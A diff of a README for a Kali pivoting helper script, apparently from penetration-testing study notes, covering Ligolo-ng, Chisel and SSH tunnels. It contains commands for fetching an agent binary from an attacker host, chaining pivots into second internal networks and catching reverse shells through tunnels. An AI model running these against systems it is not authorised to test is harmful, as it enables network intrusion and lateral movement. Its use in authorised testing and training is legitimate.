@@ -40,12 +40,39 @@ Kali-side pivot setup and reference assistant. Automates Ligolo-ng TUN interface
 # Chisel SOCKS (when SSH unavailable)
 ./pivotr.sh chisel --type socks --start-server
 
+# Access pivot's localhost services (after tunnel is up)
+sudo ip route add 240.0.0.1/32 dev ligolo
+
 # Reconnect last tunnel (after VPN drop / shell loss)
 ./pivotr.sh reconnect
 
 # Status and teardown
 ./pivotr.sh status
 ./pivotr.sh teardown --all
+```
+
+---
+
+## Decision Tree
+
+```
+Have SSH on pivot with valid creds?
+├─ YES → pivotr.sh ssh --type dynamic     (quickest, no binary upload needed)
+└─ NO  → can you upload a binary?
+         ├─ YES → pivotr.sh ligolo        (preferred: full IP routing, no proxychains)
+         └─ NO  → pivotr.sh chisel        (pure SOCKS, client connects back)
+
+Need to reach a SECOND internal network?
+└─ pivotr.sh ligolo2 --subnet 172.16.1.0/24
+   + listener_add in Ligolo console for agent forwarding
+
+Need to catch reverse shells through an existing Ligolo tunnel?
+└─ pivotr.sh listener --port 4444 --type shell
+   (listener_add in console + penelope -p 4444 -O on Kali)
+
+Need to forward ONE specific internal port (not full routing)?
+├─ SSH available  → pivotr.sh ssh --type local
+└─ SSH not avail  → pivotr.sh chisel --type forward
 ```
 
 ---
@@ -98,6 +125,9 @@ iwr http://KALI_IP:80/agent.exe -O agent.exe
 session        # select the agent
 ifconfig       # confirm internal interface
 start          # activate tunnel
+
+# Need reverse shells through this tunnel?
+# → pivotr.sh listener --port 4444
 ```
 
 **Agent binary locations searched:**
@@ -124,6 +154,7 @@ listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
 listener_list    # verify it appears
 
 # On second pivot host — agent connects THROUGH first pivot:
+# <PIVOT1_INTERNAL_IP> = the internal-facing IP shown by `ifconfig` in Pivot1's Ligolo session
 # Linux:   /tmp/agent -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert
 # Windows: .\agent.exe -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert
 
@@ -330,30 +361,6 @@ Re-establishes the most recently configured tunnel after a VPN drop, shell loss,
 
 ---
 
-## Decision Tree
-
-```
-Have SSH on pivot with valid creds?
-├─ YES → pivotr.sh ssh --type dynamic     (quickest, no binary upload needed)
-└─ NO  → can you upload a binary?
-         ├─ YES → pivotr.sh ligolo        (preferred: full IP routing, no proxychains)
-         └─ NO  → pivotr.sh chisel        (pure SOCKS, client connects back)
-
-Need to reach a SECOND internal network?
-└─ pivotr.sh ligolo2 --subnet 172.16.1.0/24
-   + listener_add in Ligolo console for agent forwarding
-
-Need to catch reverse shells through an existing Ligolo tunnel?
-└─ pivotr.sh listener --port 4444 --type shell
-   (listener_add in console + penelope -p 4444 -O on Kali)
-
-Need to forward ONE specific internal port (not full routing)?
-├─ SSH available  → pivotr.sh ssh --type local
-└─ SSH not avail  → pivotr.sh chisel --type forward
-```
-
----
-
 ## Install
 
 ```bash
@@ -373,6 +380,7 @@ sudo cp chisel_linux_amd64 /usr/local/bin/chisel && sudo chmod +x /usr/local/bin
 
 ## Related
 
+- [[ligolo-ng]] — manual Ligolo-ng commands, console reference, troubleshooting
 - [[Tunneling_Pivoting]] — manual techniques and theory
 - [[OffSec_Pivoting_Operational_Addendum]] — engagement-day pivot reference
 - [[OffSec_Pivoting_Mental_Model_Bus_Review]] — decision-tree bus review
